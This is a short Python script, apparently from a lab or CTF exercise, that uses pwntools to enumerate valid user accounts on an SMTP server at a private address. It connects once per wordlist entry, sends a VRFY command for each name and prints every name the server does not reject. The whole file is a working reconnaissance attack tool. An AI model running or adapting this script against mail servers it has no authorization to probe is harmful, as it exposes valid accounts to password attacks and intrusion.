#!/usr/bin/python3


from pwn import *
import sys
import signal
import pdb
import time

print("\n")

print("""\033[1;34m 

   ______              __                         ____                 __  __       __   _____
  / ____/  ____   ____/ /  ___    _____          / __ )   __  __       \ \/ /      / /  |__  /
 / /      / __ \ / __  /  / _ \  / ___/         / __  |  / / / /        \  /  __  / /    /_ < 
/ /___   / /_/ // /_/ /  /  __/ / /            / /_/ /  / /_/ /         / /  / /_/ /   ___/ / 
\____/   \____/ \__,_/   \___/ /_/            /_____/   \__, /         /_/   \____/   /____/  
                                                       /____/                                 

""")

def Usage():

    if len(sys.argv) != 2 :
        print("\033[1;31m Example :  python3 Brute_Users.py wordlists.txt")
        sys.exit(1)
    
Usage()

def def_handler(sig,frame):

    print('\n\n \033[1;31m [!] Aquitter La Processus ... \n')
    sys.exit(0)

#Ctrl_C
signal.signal(signal.SIGINT,def_handler)

#Creat_Bar_Progress
P1 = log.progress("\033[1;39m")

UserList = sys.argv[1]
#Open_File
file = open(UserList,'rb')

#Set_iP_And_Port
host , port = '192.168.1.154', 25

print("")

def Users_Enumeration():

    #Username = b''

    for usernames in file.readlines():
        Usernames = usernames.rstrip(b'\n')
        

        P1.status("search for Valide Usernames :   %s "  % (Usernames.decode()) )

        connect = remote(host,port, level='error')
        
        try:

            connect.recvline(b'220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls')
            connect.sendline(b'VRFY' + b' ' +  Usernames)
#           pdb.set_trace()

            Response = connect.recvline()
        
            if b"User unknown in local" not in Response:
               
                print(f"\033[1;32m [+] Valide Username :  {Usernames.decode()}")

        except Exception:
            time.sleep(2)
        
Users_Enumeration()
